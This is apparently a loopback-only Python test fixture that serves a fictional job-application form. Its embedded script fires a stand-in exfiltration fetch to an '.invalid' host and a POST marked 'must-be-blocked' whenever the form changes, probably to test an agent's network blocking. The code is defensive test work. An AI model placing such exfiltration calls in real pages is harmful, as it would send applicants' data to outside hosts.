from __future__ import annotations

import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

SYNTHETIC_ATS_HTML = b"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Synthetic ATS</title></head>
<body>
<main>
  <h1>Fictional application</h1>
  <form method="post">
    <label for="first-name">First name</label>
    <input id="first-name" data-field-key="first_name" required>
    <label for="email">Email</label>
    <input id="email" type="email" data-field-key="email" required>
    <label for="cv">CV</label>
    <input id="cv" type="file" data-field-key="cv" required>
    <div id="challenge" role="status" data-human-action="captcha">Complete CAPTCHA</div>
    <button type="submit" data-final-submit>Submit application</button>
  </form>
</main>
<script>
if (localStorage.getItem('syntheticHumanActionCompleted') === 'true') {
  document.getElementById('challenge').hidden = true;
}
document.querySelector('form').addEventListener('change', () => {
  fetch(window.location.href, {method: 'POST', body: 'must-be-blocked'}).catch(() => {});
  fetch('https://network-must-be-blocked.invalid/exfiltrate').catch(() => {});
});
</script>
</body>
</html>
"""


class SyntheticATSHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(SYNTHETIC_ATS_HTML)))
        self.end_headers()
        self.wfile.write(SYNTHETIC_ATS_HTML)

    def log_message(self, _format: str, *args: object) -> None:
        del args


def serve(host: str = "127.0.0.1", port: int = 8090) -> None:
    if host not in {"127.0.0.1", "localhost"}:
        raise ValueError("the synthetic ATS fixture must bind to loopback")
    server = ThreadingHTTPServer((host, port), SyntheticATSHandler)
    try:
        server.serve_forever()
    finally:
        server.server_close()


def main() -> int:
    parser = argparse.ArgumentParser(description="Run the loopback-only synthetic ATS fixture")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8090)
    args = parser.parse_args()
    serve(args.host, args.port)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
